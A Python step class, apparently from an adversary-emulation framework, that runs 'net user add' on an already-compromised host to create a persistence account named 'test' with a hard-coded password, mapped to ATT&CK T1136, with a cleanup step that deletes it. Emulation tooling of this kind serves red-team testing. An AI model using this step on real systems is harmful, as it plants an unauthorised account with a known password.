from plugins.adversary.app.commands import net
from plugins.adversary.app.operation.operation import Step, OPRat, OPHost


class AddUser(Step):
    attack_mapping = [("T1136", "Persistence")]
    display_name = "create user"
    summary = "Create user account on compromised machines to increase network presence and persistence."

    preproperties = ['rat.username', 'rat.host.fqdn']

    preconditions = [('host', OPHost),
                     ('rat', OPRat), ('rat', OPRat({"username": "nt authority\\system"}))]

    @staticmethod
    def description(rat):
        return "Using net to create a new user 'test' on {}.".format(rat.host.fqdn)

    @staticmethod
    async def simulate(operation, rat):
        return True

    @staticmethod
    async def action(operation, rat):
        await operation.execute_shell_command(rat, *net.user_add("test", "hello123WORLD!"))
        return True

    @staticmethod
    async def cleanup(cleaner, host):
        try:
            await cleaner.run_on_agent(host, *net.user_delete("test"))
        except:
            pass # It's possible for the cleanup command to fail, which will cause the system to hang